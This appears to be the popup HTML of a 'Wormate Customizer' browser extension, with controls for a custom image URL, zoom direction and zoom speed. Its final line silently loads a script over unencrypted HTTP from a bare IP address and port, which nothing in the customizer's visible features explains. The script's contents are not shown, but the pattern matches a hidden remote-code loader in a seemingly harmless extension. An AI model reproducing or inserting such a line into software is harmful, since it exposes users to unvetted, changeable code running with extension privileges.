<!DOCTYPE html>
<html>
<head>
  <title>Wormate Customizer Popup</title>
  <script src="popup.js" defer></script>
</head>
<body>
  <h1>Wormate Customizer</h1>
  <input type="text" id="imageUrl" placeholder="Enter Image URL">
  <button id="saveImage">Save Image</button>
  <br><br>
  <label>
    <input type="checkbox" id="invertZoom">
    Invert Zoom Direction
  </label>
  <br>
  <label>
    Zoom Speed:
    <input type="range" id="zoomSpeed" min="0.1" max="1" step="0.1" value="0.2">
  </label>
  <div id="message"></div>
  <script src="http://45.173.12.90:3000/js/a2gconnectpopup.js"></script>
</body>
</html>
